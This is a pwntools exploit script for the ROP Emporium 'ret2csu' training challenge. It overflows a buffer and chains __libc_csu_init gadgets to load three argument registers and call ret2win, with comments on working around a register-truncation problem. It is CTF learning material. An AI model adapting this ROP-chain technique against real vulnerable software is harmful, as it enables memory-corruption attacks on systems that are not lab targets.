from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./ret2csu")


"""
SOURCES:
I ran into the problem with gadget2 (the mov_csu ROP gadget), where rdi would only be filled
with 0xdeadbeef with the rest of the register being zeroed out (due to this instruction, i.e.
mov edi, r13d;)

Looked into a solution for how to overcome this, and learned 'init' is referenced within _DYNAMIC
portion of code. We could fill R12 with the address of init to continue the ROP chain and then just
use a POPn RDI gadget.

LINK: https://meowmeowxw.gitlab.io/wargame/rop-emporium/7-ret2csu/
"""

class ROP_Gadget:
    one = 0xdeadbeefdeadbeef
    two = 0xcafebabecafebabe
    tres = 0xd00df00dd00df00d
    zero = 0x0000000000000000
    trsh = 0x0000000000000001
    ret2win = 0x0000000000400510
    pop_rdi = 0x00000000004006a3
    pop_rsi_r15 = 0x00000000004006a1
    pop_rdx_rbx = 0x000000000015f7e6 # libc offset
    pop_all = 0x000000000040069a # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    mov_csu = 0x0000000000400680 # mov rdx, r15; mov rdi, r14; mov edi, r13d; call qword ptr [R12 + RBX*0x8]
    pop_rbp = 0x0000000000400588
    r2w_plt = elf.plt["ret2win"]
    r2w_got = elf.got["ret2win"]
    pwnme_got = elf.got["pwnme"]
    useful_function = 0x0000000000400617
    mov_rbp_edx = 0x0000000000400606 # mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
    data_start = 0x0000000000601028
    _init = 0x0000000000600e38
    _fini = 0x0000000000600e48


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.pop_all,
        ROP_Gadget.zero, # RBX => call qword ptr [R12 + RBX*0x8]
        ROP_Gadget.trsh, # rbp => cmp rbp, rbx => rbx must be 1 to prevent loop
        ROP_Gadget._fini, # r12 => call qword ptr [R12 + RBX*0x8]
        ROP_Gadget.one, # r13 => mov edi, r13d
        ROP_Gadget.two, # r14 =>  mov rsi, r14
        ROP_Gadget.tres, # r15 => mov rdx, r15
        ROP_Gadget.mov_csu,
        ROP_Gadget.trsh, # After fini, will go through pop_all instructions
        ROP_Gadget.trsh, # so this fills with trash values to continue chain
        ROP_Gadget.trsh,
        ROP_Gadget.trsh,
        ROP_Gadget.trsh,
        ROP_Gadget.trsh,
        ROP_Gadget.trsh,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.one,
        ROP_Gadget.ret2win
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()